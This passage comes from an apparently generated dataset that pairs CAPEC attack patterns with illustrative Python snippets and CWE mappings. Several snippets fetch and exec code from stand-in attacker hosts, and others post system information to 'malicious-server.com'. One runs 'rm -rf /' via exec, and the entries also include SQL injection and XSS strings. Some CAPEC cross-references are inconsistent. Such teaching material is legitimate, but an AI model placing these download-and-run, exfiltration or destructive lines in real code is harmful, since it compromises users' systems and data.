        "code_snippet": "class HardwareComponent:\n    def __init__(self):\n        # CWE-1221: Incorrect Register Defaults or Module Parameters\n        self.register_defaults = {'security_mode': 0}  # Insecure default value\n        self.lock_bit = 0  # CWE-1231: Improper Prevention of Lock Bit Modification\n        self.debug_mode = True  # CWE-1296: Incorrect Chaining or Granularity of Debug Components\n\n    def set_security_mode(self, mode):\n        if self.lock_bit == 0:  # Lock bit can be modified\n            self.register_defaults['security_mode'] = mode\n        else:\n            print('Security mode is locked and cannot be modified.')\n\n    def enable_debug(self):\n        if self.debug_mode:\n            print('Debug mode enabled.')\n        else:\n            print('Debug mode disabled.')\n\n    def lock_security_mode(self):\n        self.lock_bit = 1\n\n# CWE-1059: Insufficient Technical Documentation\n# No detailed documentation provided for the usage, structure, or configuration of the class\n\n# CWE-657: Violation of Secure Design Principles\n# The design allows modification of security settings without proper checks\n\n# Example usage\ncomponent = HardwareComponent()\ncomponent.set_security_mode(1)  # Attempt to set security mode to a secure value\ncomponent.lock_security_mode()  # Lock the security mode\ncomponent.set_security_mode(0)  # Attempt to change security mode after locking\ncomponent.enable_debug()  # Enable debug mode",
        "description": "This Python code snippet represents a simplified model of a hardware component with several security flaws. The class `HardwareComponent` has insecure default values for its registers (CWE-1221), allows modification of a lock bit after it has been set (CWE-1231), and has an insecure debug mode configuration (CWE-1296). Additionally, the class lacks sufficient technical documentation (CWE-1059) and violates secure design principles by allowing security settings to be modified without proper checks (CWE-657). The code demonstrates how an attacker could exploit these vulnerabilities to alter the hardware's behavior."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, name, version, updateable=True):\n        self.name = name\n        self.version = version\n        self.updateable = updateable\n\n    def update_firmware(self, new_version):\n        if not self.updateable:\n            raise Exception('Component is not updateable')\n        self.version = new_version\n        print(f'Firmware updated to version {new_version}')\n\nclass System:\n    def __init__(self):\n        self.components = []\n\n    def add_component(self, component):\n        if not self.trustworthy_component(component):\n            raise Exception('Component is not sufficiently trustworthy')\n        self.components.append(component)\n        print(f'Component {component.name} added to the system')\n\n    def trustworthy_component(self, component):\n        # Simulate a check for trustworthiness\n        return component.name != 'malicious_component'\n\n# Simulate adding a malicious hardware component\ntry:\n    system = System()\n    malicious_component = HardwareComponent('malicious_component', '1.0', updateable=False)\n    system.add_component(malicious_component)\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet represents the concept of 'Malicious Hardware Component Replacement' by simulating the addition of hardware components to a system. The `HardwareComponent` class includes attributes for the component's name, version, and whether it is updateable. The `System` class manages these components and includes a method to check if a component is trustworthy. The code attempts to add a malicious, non-updateable component to the system, which raises an exception, demonstrating the risks associated with relying on untrustworthy and non-updateable components. This embodies the CAPEC idea and highlights related CWEs such as reliance on non-updateable components, insufficiently trustworthy components, and the potential for embedded malicious code."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# Using a vulnerable third-party library to download and execute malicious code\nvulnerable_url = 'http://malicious.example.com/malware.py'\n\n# CWE-506: Embedded Malicious Code\n# Downloading and executing the malicious code\nresponse = requests.get(vulnerable_url)\nexec(response.text)\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# The downloaded code could contain a virus or worm that replicates itself\n# CWE-1229: Creation of Emergent Resource\n# The malicious code could create new resources or files that violate security policies\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# The malicious code could inject errors to degrade system redundancy\n",
        "description": "This Python code snippet demonstrates the concept of 'Malicious Software Implanted' in a supply chain distribution channel. It uses a vulnerable third-party component (CWE-1395) to download and execute malicious code from a specified URL (CWE-506). The downloaded code could potentially contain a virus or worm that replicates itself (CWE-509), create new resources that violate security policies (CWE-1229), or inject errors to degrade system redundancy (CWE-1334). This snippet embodies the main idea of the CAPEC by showing how an attacker can implant malicious software into a system through a vulnerable dependency."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import sqlite3\nimport requests\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nresponse = requests.get('http://untrusted-source.com/malicious_library.py')\nexec(response.text)\n\n# CWE-89: SQL Injection vulnerability\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\nuser_input = \"' OR '1'='1\"  # Malicious input\nquery = f\"SELECT * FROM users WHERE username = '{user_input}'\"\ncursor.execute(query)\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"os.system('rm -rf /')\"  # Dangerous command\nexec(malicious_code)\n\n# CWE-707: Improper Neutralization\nmessage = \"<script>alert('XSS')</script>\"\nprint(f\"Received message: {message}\")\n\n# CWE-1334: Unauthorized Error Injection\nclass RedundantSystem:\n    def __init__(self):\n        self.redundant_block = [1, 1, 1]  # Simplified redundancy\n\n    def inject_error(self):\n        self.redundant_block[0] = 0  # Injecting error\n\nsystem = RedundantSystem()\nsystem.inject_error()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Rogue Integration Procedures'. The code includes: 1) CWE-829: Importing and executing code from an untrusted source, which could introduce malicious functionality. 2) CWE-89: An SQL Injection vulnerability that allows an attacker to manipulate SQL queries. 3) CWE-506: Embedded malicious code that executes a dangerous system command. 4) CWE-707: Improper neutralization of input, leading to potential XSS attacks. 5) CWE-1334: Unauthorized error injection that degrades system redundancy. The code represents the main idea of the CAPEC by showing how an attacker could alter or establish rogue processes to insert malicious components into a system."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import xml.etree.ElementTree as ET\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    try:\n        xml_data = request.data\n        tree = ET.ElementTree(ET.fromstring(xml_data))\n        # Process the XML data (omitted for brevity)\n        return 'XML processed successfully', 200\n    except ET.ParseError:\n        return 'Invalid XML', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web service using Flask that processes XML data sent via POST requests. The code lacks proper validation and resource allocation limits, making it vulnerable to an XML Flood attack (CAPEC-230). Specifically, it does not validate the XML against a schema (CWE-112), does not impose any limits on the size or number of XML requests (CWE-770), and does not handle potential XML injection (CWE-91) or external entity references (CWE-611). An attacker could exploit these weaknesses by sending a large number of XML requests, causing the service to become unstable or crash, resulting in a denial of service."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import os\nimport socket\nimport platform\nimport requests\n\n# Collect system information\nsystem_info = {\n    'os': platform.system(),\n    'os_version': platform.version(),\n    'hostname': socket.gethostname(),\n    'ip_address': socket.gethostbyname(socket.gethostname()),\n    'user': os.getlogin()\n}\n\n# Send collected information to an external server\nrequests.post('http://malicious-server.com/collect', json=system_info)\n",
        "description": "This Python code snippet demonstrates a basic form of malware-directed internal reconnaissance. It collects sensitive system information such as the operating system, OS version, hostname, IP address, and the current user. This information is then sent to an external server controlled by an attacker. The code embodies the main idea of CAPEC-270 (Malware-Directed Internal Reconnaissance) by using malware to gather and exfiltrate information about the target system. The related CWEs are represented as follows:\n- CWE-497: The code exposes sensitive system information to an unauthorized control sphere by sending it to an external server.\n- CWE-506: The code contains malicious behavior by design, as it collects and exfiltrates sensitive information.\n- CWE-512: The code acts as spyware by collecting personally identifiable information without the user's consent.\n- CWE-509: Although not replicating, the code could be part of a larger malware that spreads to other systems."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import requests\n\nclass ThirdPartyComponent:\n    def __init__(self, url):\n        self.url = url\n        self.data = None\n\n    def fetch_data(self):\n        try:\n            response = requests.get(self.url)\n            if response.status_code == 200:\n                self.data = response.text\n            else:\n                raise ValueError('Failed to fetch data from the component')\n        except Exception as e:\n            print(f'Error fetching data: {e}')\n\n    def process_data(self):\n        if self.data:\n            # Simulate processing of the data\n            print('Processing data...')\n        else:\n            print('No data to process')\n\n# Usage of the third-party component\ncomponent = ThirdPartyComponent('http://example.com/malicious_component')\ncomponent.fetch_data()\ncomponent.process_data()",
        "description": "This Python code snippet demonstrates the concept of 'Provide Counterfeit Component' by simulating the use of a third-party component that could be malicious. The `ThirdPartyComponent` class fetches data from a given URL, which represents the counterfeit component provided by an attacker. The `fetch_data` method attempts to retrieve data from the URL, and if successful, stores it in the `data` attribute. The `process_data` method simulates processing this data. This code embodies the CAPEC by showing how an attacker can introduce a counterfeit component during the procurement process, leading to potential vulnerabilities such as dependency on a vulnerable third-party component (CWE-1395), reliance on an insufficiently trustworthy component (CWE-1357), and the risk of embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "import os\n\nclass HardwareComponent:\n    def __init__(self, name, version, updateable=True):\n        self.name = name\n        self.version = version\n        self.updateable = updateable\n\n    def update_firmware(self, new_version):\n        if not self.updateable:\n            raise Exception('Component is not updateable')\n        self.version = new_version\n        print(f'Firmware updated to version {new_version}')\n\n    def inject_error(self):\n        print('Error injected into hardware component')\n\n    def execute_malicious_code(self):\n        print('Executing malicious code...')\n        os.system('echo Malicious code executed')\n\n# Simulating substitution of a tested component with a malicious one\ntrusted_component = HardwareComponent('TrustedComponent', '1.0')\nmalicious_component = HardwareComponent('MaliciousComponent', '1.0', updateable=False)\n\n# Attempting to update firmware on a non-updateable component\ntry:\n    malicious_component.update_firmware('2.0')\nexcept Exception as e:\n    print(e)\n\n# Injecting error to degrade hardware redundancy\nmalicious_component.inject_error()\n\n# Executing embedded malicious code\nmalicious_component.execute_malicious_code()",
        "description": "This Python code snippet simulates the substitution of a trusted hardware component with a malicious one, embodying the main idea of the CAPEC 'Hardware Component Substitution'. The 'HardwareComponent' class represents a hardware component with attributes for name, version, and whether it is updateable. The 'update_firmware' method attempts to update the firmware, raising an exception if the component is not updateable (CWE-1329). The 'inject_error' method simulates error injection to degrade hardware redundancy (CWE-1334). The 'execute_malicious_code' method simulates the execution of embedded malicious code (CWE-506). The code demonstrates how an attacker could substitute a trusted component with a malicious one, leading to potential vulnerabilities and compromises."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "import os\n\nclass BIOSUpdater:\n    def __init__(self, firmware_path):\n        self.firmware_path = firmware_path\n        self.lock_bit = False\n\n    def update_firmware(self, new_firmware):\n        if not self.lock_bit:\n            with open(self.firmware_path, 'wb') as firmware_file:\n                firmware_file.write(new_firmware)\n            print('Firmware updated successfully.')\n        else:\n            print('Firmware update blocked by lock bit.')\n\n    def set_lock_bit(self):\n        self.lock_bit = True\n        print('Lock bit set. Firmware updates are now restricted.')\n\n    def modify_lock_bit(self, new_value):\n        self.lock_bit = new_value\n        print(f'Lock bit modified to {new_value}.')\n\n# Simulate an attacker modifying the lock bit and updating the BIOS with malicious code\nbios_updater = BIOSUpdater('/path/to/firmware')\nbios_updater.set_lock_bit()\nbios_updater.modify_lock_bit(False)  # CWE-1231: Improper Prevention of Lock Bit Modification\nmalicious_firmware = b'Malicious Code'  # CWE-506: Embedded Malicious Code\nbios_updater.update_firmware(malicious_firmware)",
        "description": "This Python code snippet simulates a BIOS update process that embodies the main idea of the CAPEC 'Altered Installed BIOS'. The BIOSUpdater class allows for updating firmware, setting a lock bit to prevent updates, and modifying the lock bit. The code demonstrates a scenario where an attacker modifies the lock bit (CWE-1231) to allow a malicious firmware update (CWE-506). This represents the vulnerability where an attacker can send and install a maliciously altered BIOS, leading to future exploitation. The code also highlights the lack of proper update mechanisms and insufficient access control granularity, as the lock bit can be easily modified."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_update.exe'\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('update.exe', 'wb') as file:\n    file.write(response.content)\n\n# CWE-506: Embedded Malicious Code\n# Execute the downloaded file without verifying its integrity\nos.system('update.exe')\n",
        "description": "This Python code snippet demonstrates a scenario where an attacker introduces malicious code to a victim's system by altering the payload of a software update. The code downloads an executable from a remote location (CWE-494: Download of Code Without Integrity Check) and saves it locally. It then executes the downloaded file without performing any integrity checks, potentially running embedded malicious code (CWE-506: Embedded Malicious Code). This represents the main idea of the CAPEC 'Malicious Manual Software Update', where an attacker can compromise a system by tricking the user into downloading and executing a malicious update."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self.updateable = False  # CWE-1277: Firmware Not Updateable\n\n    def replace_component(self, new_component):\n        if not self.verify_component(new_component):\n            raise ValueError('Malicious component detected!')\n        self.firmware_version = new_component.firmware_version\n\n    def verify_component(self, component):\n        # CWE-506: Embedded Malicious Code\n        # Simulate a basic check for malicious code\n        if 'malicious' in component.firmware_version:\n            return False\n        return True\n\n# Simulate an adversary introducing a malicious hardware update\nmalicious_component = HardwareComponent('malicious_v1.0')\n\n# Original hardware component\noriginal_component = HardwareComponent('v1.0')\n\ntry:\n    original_component.replace_component(malicious_component)\nexcept ValueError as e:\n    print(e)  # Output: Malicious component detected!",
        "description": "This Python code snippet represents the concept of a 'Malicious Hardware Update' (CAPEC) by simulating the replacement of a hardware component with a malicious one. The `HardwareComponent` class has a firmware version and a flag indicating whether it is updateable (CWE-1277). The `replace_component` method attempts to replace the current component with a new one, but first verifies the new component to check for malicious code (CWE-506). If the new component is detected as malicious, an error is raised. This demonstrates how an adversary could introduce a malicious hardware update and the importance of verifying components to prevent such attacks."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class MaliciousHardwareComponent:\n    def __init__(self):\n        self.firmware_version = '1.0.0'\n        self.malicious_code = self._embed_malicious_code()\n\n    def _embed_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        return 'malicious_payload'\n\n    def update_firmware(self, new_version):\n        # CWE-1329: Reliance on Component That is Not Updateable\n        print('Firmware update not supported.')\n\n    def use_vulnerable_component(self):\n        # CWE-1395: Dependency on Vulnerable Third-Party Component\n        vulnerable_component = 'vulnerable_library_v1.0'\n        print(f'Using {vulnerable_component}')\n\n    def access_confidential_info(self):\n        # CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        confidential_info = 'user_credentials'\n        print(f'Accessing confidential information: {confidential_info}')\n\n# Simulate the use of malicious hardware component\nmalicious_component = MaliciousHardwareComponent()\nmalicious_component.update_firmware('1.0.1')\nmalicious_component.use_vulnerable_component()\nmalicious_component.access_confidential_info()",
        "description": "This Python code snippet represents a malicious hardware component that embodies the main idea of the CAPEC 'Malicious Gray Market Hardware'. The class 'MaliciousHardwareComponent' includes several methods that demonstrate vulnerabilities related to the specified CWEs. The '_embed_malicious_code' method simulates CWE-506 by embedding a malicious payload. The 'update_firmware' method shows CWE-1329 by not supporting firmware updates. The 'use_vulnerable_component' method demonstrates CWE-1395 by using a vulnerable third-party component. Finally, the 'access_confidential_info' method represents CWE-1297 by accessing unprotected confidential information. This code illustrates how an attacker could maliciously alter hardware components to compromise systems."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive configuration data')\n    temp_file_path = temp_file.name\n\n# CWE-284: Improper Access Control\nos.chmod(temp_file_path, 0o777)  # Insecure permissions\n\n# CWE-99: Improper Control of Resource Identifiers\nconfig_file_path = '/etc/config/' + os.path.basename(temp_file_path)\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\nwith open(config_file_path, 'w') as config_file:\n    with open(temp_file_path, 'r') as temp_file:\n        config_file.write(temp_file.read())\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Simulated by writing to a debug file\nwith open('/sys/kernel/debug/debug_file', 'w') as debug_file:\n    debug_file.write('Activate debug mode')\n\nprint('Configuration complete.')",
        "description": "This Python code snippet demonstrates a scenario where an attacker can inject malicious data during the configuration process, leading to suboptimal system performance. The code creates an insecure temporary file (CWE-377) with sensitive configuration data and sets improper access permissions (CWE-284). It then improperly controls resource identifiers by moving the temporary file to a critical configuration directory (CWE-99). Sensitive information is inserted into the configuration file (CWE-201), and debug logic is activated at runtime (CWE-1313), potentially altering the system's behavior. This embodies the CAPEC's main idea of data injection during configuration to compromise the system."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n\n# Malicious function to exfiltrate sensitive information\ndef exfiltrate_data(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            data = file.read()\n            # Simulate sending data to an unauthorized external server\n            send_to_server(data)\n    except Exception as e:\n        print(f'Error accessing file: {e}')\n\n# Simulated function to send data to an unauthorized server\ndef send_to_server(data):\n    # CWE-497: Exposing sensitive system information\n    print(f'Sending data to malicious server: {data}')\n\n# CWE-1329: Reliance on Component That is Not Updateable\n# Simulate a hardware component that cannot be updated\nclass NonUpdateableComponent:\n    def __init__(self):\n        self.firmware_version = '1.0'\n\n    def perform_operation(self):\n        # CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        print('Performing operation with potential vulnerability to voltage and clock glitches')\n\n# Main function to simulate the infiltration\nif __name__ == '__main__':\n    # Path to a sensitive file (simulated)\n    sensitive_file_path = '/path/to/sensitive/file.txt'\n    exfiltrate_data(sensitive_file_path)\n\n    # Simulate usage of a non-updateable hardware component\n    component = NonUpdateableComponent()\n    component.perform_operation()",
        "description": "This Python code snippet simulates the infiltration of a hardware development environment by embedding malicious code that exfiltrates sensitive information. The `exfiltrate_data` function reads a sensitive file and sends its contents to a simulated unauthorized server, representing CWE-506 (Embedded Malicious Code) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The `NonUpdateableComponent` class simulates a hardware component that cannot be updated (CWE-1329) and performs an operation that is vulnerable to voltage and clock glitches (CWE-1247). The code demonstrates how an adversary might manipulate the development environment to compromise hardware components, aligning with the CAPEC description."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_library.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef malicious_function():\n    # Malicious code that could replicate or cause harm\n    print('Malicious code executed')\n    # Example of replicating malicious code\n    with open('malicious_copy.py', 'w') as f:\n        f.write(response.text)\n\nmalicious_function()",
        "description": "This Python code snippet demonstrates the concept of 'Open-Source Library Manipulation' by downloading and executing code from an untrusted source without verifying its integrity (CWE-494). The code imports and executes functionality from an external source (CWE-829), which could contain embedded malicious code (CWE-506) or depend on vulnerable third-party components (CWE-1395). The 'malicious_function' represents a potential payload that could replicate itself (CWE-509) by writing a copy of the downloaded code to a new file."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "class ASIC:\n    def __init__(self):\n        self.security_token = 'secure_token'\n        self.sensitive_info = 'secret_data'\n\n    def execute(self, command):\n        if command == 'malicious_command':\n            self._malicious_functionality()\n        else:\n            print('Executing:', command)\n\n    def _malicious_functionality(self):\n        # CWE-506: Embedded Malicious Code\n        print('Malicious functionality executed!')\n        # CWE-497: Exposure of Sensitive System Information\n        print('Sensitive Info:', self.sensitive_info)\n\n# CWE-1294: Insecure Security Identifier Mechanism\n# CWE-1259: Improper Restriction of Security Token Assignment\nasic = ASIC()\nasic.execute('malicious_command')",
        "description": "This Python code snippet simulates an ASIC (Application-Specific Integrated Circuit) with embedded malicious functionality. The `ASIC` class contains sensitive information and a security token. The `execute` method checks for a specific command ('malicious_command') and triggers a private method `_malicious_functionality` if the command matches. This private method represents the embedded malicious code (CWE-506) and exposes sensitive information (CWE-497). The code also highlights issues with insecure security identifier mechanisms (CWE-1294) and improper restriction of security token assignment (CWE-1259) by not properly securing the sensitive information and security token."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "def read_buffer(data, index):\n    try:\n        return data[index]\n    except IndexError:\n        return 'Index out of bounds!'\n\n# Example usage\nbuffer = [1, 2, 3, 4, 5]\nprint(read_buffer(buffer, 10))  # Attempt to read beyond the buffer\n",
        "description": "This Python code snippet demonstrates an 'Overread Buffers' vulnerability. The function 'read_buffer' attempts to access an element in the 'data' list at the specified 'index'. If the 'index' is out of the bounds of the 'data' list, an 'IndexError' is caught, and a message 'Index out of bounds!' is returned. The example usage shows an attempt to read beyond the buffer's boundary by accessing the 10th element of a 5-element list, which triggers the out-of-bounds read. This code represents the main idea of CAPEC-129: Overread Buffers, and is related to CWE-125: Out-of-bounds Read, CWE-126: Buffer Over-read, and CWE-127: Buffer Under-read."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import time\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username == 'admin' and password == 'password123':\n        time.sleep(0.5)  # Simulate processing time for valid credentials\n        return 'Login successful', 200\n    else:\n        time.sleep(0.1)  # Simulate processing time for invalid credentials\n        return 'Login failed', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application with a login endpoint. The login function checks the provided username and password against hardcoded values. If the credentials are correct, it simulates a longer processing time (0.5 seconds) compared to incorrect credentials (0.1 seconds). This timing discrepancy can be observed by an attacker to infer whether the provided credentials are correct or not, embodying the concept of 'Observable Timing Discrepancy' (CWE-208). This behavior can be exploited for application fingerprinting (CAPEC-170) by revealing internal state information based on response times."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import os\nimport requests\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-512: Spyware\n\nclass TargetedMalware:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def gather_system_info(self):\n        # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        system_info = {\n            'os': os.name,\n            'user': os.getenv('USER') or os.getenv('USERNAME'),\n            'home_dir': os.path.expanduser('~')\n        }\n        return system_info\n\n    def send_info(self, info):\n        # CWE-509: Replicating Malicious Code (Virus or Worm)\n        requests.post(self.target_url, data=info)\n\n    def execute(self):\n        info = self.gather_system_info()\n        self.send_info(info)\n\n# Example usage\nmalware = TargetedMalware('http://malicious-server.com/collect')\nmalware.execute()",
        "description": "This Python code snippet represents a targeted malware attack. The `TargetedMalware` class is designed to gather sensitive system information (CWE-497) such as the operating system, username, and home directory. This information is then sent to a specified target URL, simulating the behavior of spyware (CWE-512). The code also embodies the concept of a Trojan Horse (CWE-507) by appearing to be a benign class but performing malicious actions. Additionally, the code could be extended to replicate itself or perform further attacks, aligning with the idea of replicating malicious code (CWE-509). The main idea of the CAPEC is to demonstrate how targeted malware can exploit known vulnerabilities to gather and exfiltrate sensitive information from an organizational IT environment."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "import requests\nfrom flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    return redirect(target_url)\n\n# CWE-494: Download of Code Without Integrity Check\n@app.route('/download')\ndef download_code():\n    code_url = request.args.get('code_url')\n    response = requests.get(code_url)\n    exec(response.text)\n    return 'Code executed'\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\n@app.route('/transfer', methods=['POST'])\ndef transfer_funds():\n    amount = request.form['amount']\n    # Simulate a fund transfer without CSRF protection\n    return f'Transferred {amount} dollars'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a counterfeit website that embodies several security weaknesses described in the CAPEC and related CWEs. The '/redirect' route demonstrates CWE-601 by redirecting users to a URL specified by user input, which can be exploited for phishing attacks. The '/download' route illustrates CWE-494 by downloading and executing code from a user-specified URL without verifying its integrity, potentially allowing the execution of malicious code. The '/transfer' route simulates a fund transfer operation without CSRF protection (CWE-352), making it vulnerable to CSRF attacks. This code represents the main idea of creating a counterfeit website to gather information or upload malware by exploiting these vulnerabilities."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import ssl\nimport socket\n\n# CWE-295: Improper Certificate Validation\ncontext = ssl.create_default_context()\ncontext.check_hostname = False  # Disabling hostname check\ncontext.verify_mode = ssl.CERT_NONE  # Disabling certificate verification\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndef connect_to_server(server_address):\n    try:\n        with socket.create_connection((server_address, 443)) as sock:\n            with context.wrap_socket(sock, server_hostname=server_address) as ssock:\n                print(f'Connected to {server_address}')\n                # CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n                # CWE-1229: Creation of Emergent Resource\n                # CWE-656: Reliance on Security Through Obscurity\n                # Simulating communication with a counterfeit organization\n                ssock.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + server_address.encode() + b'\\r\\n\\r\\n')\n                response = ssock.recv(1024)\n                print(response.decode())\n    except Exception as e:\n        print(f'Failed to connect to {server_address}: {e}')\n\n# Example usage\nconnect_to_server('counterfeit.example.com')",
        "description": "This Python code snippet demonstrates a scenario where an adversary creates a counterfeit organization that appears legitimate but injects malicious components into the supply chain. The code disables SSL certificate validation (CWE-295), making it easier for an attacker to impersonate a legitimate server. It also incorrectly specifies the destination in a communication channel (CWE-941), potentially directing traffic to a malicious server. The code simulates communication with this counterfeit organization, which could lead to observable behavioral discrepancies (CWE-207), creation of emergent resources (CWE-1229), and reliance on security through obscurity (CWE-656). This represents the main idea of the CAPEC by showing how an attacker can exploit these weaknesses to compromise the supply chain."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import os\nimport mmap\n\n# Simulate sensitive data in a file\nsensitive_file_path = 'sensitive_data.txt'\nwith open(sensitive_file_path, 'w') as f:\n    f.write('Sensitive Information: SecretKey123')\n\n# Improperly zeroize sensitive data in memory\nwith open(sensitive_file_path, 'r+b') as f:\n    mm = mmap.mmap(f.fileno(), 0)\n    mm.write(b'\\x00' * len(mm))  # Attempt to clear data\n    mm.close()\n\n# Simulate improper scrubbing of sensitive data\nos.remove(sensitive_file_path)\n\n# Simulate pulling data from system resources\nwith open('/proc/self/maps', 'r') as maps_file:\n    for line in maps_file:\n        if sensitive_file_path in line:\n            print(f'Found sensitive file mapping: {line.strip()}')\n\n# Simulate reading remanent data\nwith open('/proc/self/mem', 'rb') as mem_file:\n    mem_file.seek(0)\n    data = mem_file.read(1024)\n    if b'SecretKey123' in data:\n        print('Sensitive data found in memory!')",
        "description": "This Python code snippet demonstrates a scenario where sensitive information is improperly handled, leading to potential exposure. The code first writes sensitive data to a file and then attempts to zeroize it in memory using mmap. However, this zeroization is not secure. The file is then deleted, simulating improper scrubbing. The code then searches system resources (e.g., /proc/self/maps) to find mappings related to the sensitive file and reads from /proc/self/mem to demonstrate that sensitive data can still be found in memory. This embodies the CAPEC of pulling data from system resources and highlights related CWEs such as improper zeroization, improper scrubbing, and remanent data being readable after memory erase."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import os\nimport tempfile\n\nclass CloudStorage:\n    def __init__(self):\n        self.storage = tempfile.NamedTemporaryFile(delete=False)\n\n    def store_data(self, data):\n        self.storage.write(data.encode('utf-8'))\n        self.storage.flush()\n\n    def delete_data(self):\n        # Incomplete deletion: only closing the file, not securely wiping the data\n        self.storage.close()\n        os.remove(self.storage.name)\n\n# Simulating a multi-tenant environment\ncloud_storage = CloudStorage()\ncloud_storage.store_data('Sensitive Information')\ncloud_storage.delete_data()\n\n# New tenant accessing the same storage resource\nnew_tenant_storage = CloudStorage()\nwith open(new_tenant_storage.storage.name, 'r') as file:\n    leftover_data = file.read()\n    print('Leftover data:', leftover_data)",
        "description": "This Python code snippet simulates a cloud storage system in a multi-tenant environment where sensitive data is not securely deleted. The `CloudStorage` class provides methods to store and delete data. However, the `delete_data` method only closes and removes the file without securely wiping its contents, leading to potential data leakage. When a new tenant accesses the same storage resource, they can read leftover sensitive information. This example embodies the CAPEC of 'Incomplete Data Deletion in a Multi-Tenant Environment' and highlights related CWEs such as 'Improper Scrubbing of Sensitive Data from Decommissioned Device' and 'Improper Removal of Sensitive Information Before Storage or Transfer'."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class DeviceComponent:\n    def __init__(self, data):\n        self.data = data\n\n    def destroy(self):\n        # CWE-1082: Class Instance Self Destruction Control Element\n        del self\n\n    def remove_data(self):\n        # CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n        self.data = None\n\n    def __del__(self):\n        # CWE-1087: Class with Virtual Method without a Virtual Destructor\n        pass\n\n# Simulating physical destruction of the device\ncomponent = DeviceComponent('sensitive information')\ncomponent.remove_data()  # Attempt to remove data\ncomponent.destroy()  # Destroy the component",
